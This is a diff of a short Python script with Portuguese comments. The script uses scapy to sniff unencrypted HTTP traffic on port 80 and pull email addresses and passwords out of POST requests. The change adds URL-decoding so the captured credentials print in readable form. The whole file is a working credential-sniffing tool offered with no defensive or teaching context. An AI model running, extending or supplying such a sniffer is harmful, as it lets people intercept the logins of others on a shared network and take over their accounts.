@@ -1,33 +1,32 @@
 from scapy.all import sniff, Raw
+from urllib.parse import unquote
 
 def processar(pacote):
-    # Só pega pacotes que têm payload (Raw)
     if pacote.haslayer(Raw):
         try:
             data = pacote[Raw].load.decode(errors="ignore").lower()
 
-            # Filtra apenas POSTs com email ou passwd
             if "post" in data and ("email=" in data or "passwd=" in data):
 
                 print("\n[🚨 DADOS CAPTURADOS 🚨]")
                 print("-----------------------------------------")
 
-                # Extrai email
+                # Extrai e decodifica o email
                 if "email=" in data:
-                    email = data.split("email=", 1)[1].split("&")[0]
+                    email_raw = data.split("email=", 1)[1].split("&")[0]
+                    email = unquote(email_raw)
                     print(f"[EMAIL]  {email}")
 
-                # Extrai senha
+                # Extrai e decodifica a senha
                 if "passwd=" in data:
-                    passwd = data.split("passwd=", 1)[1].split("&")[0]
-                    print(f"[PASSWD] {passwd}")
+                    pass_raw = data.split("passwd=", 1)[1].split("&")[0]
+                    password = unquote(pass_raw)
+                    print(f"[PASSWD] {password}")
 
                 print("-----------------------------------------\n")
 
         except Exception:
             pass
 
-
-# Sniff na porta 80 (HTTP)
-print("[*] Sniffer ativo. Aguardando POSTs...")
+print("[*] Sniffer ativo. Aguardando POSTs decodificados...")
 sniff(filter="tcp port 80", prn=processar, store=False)
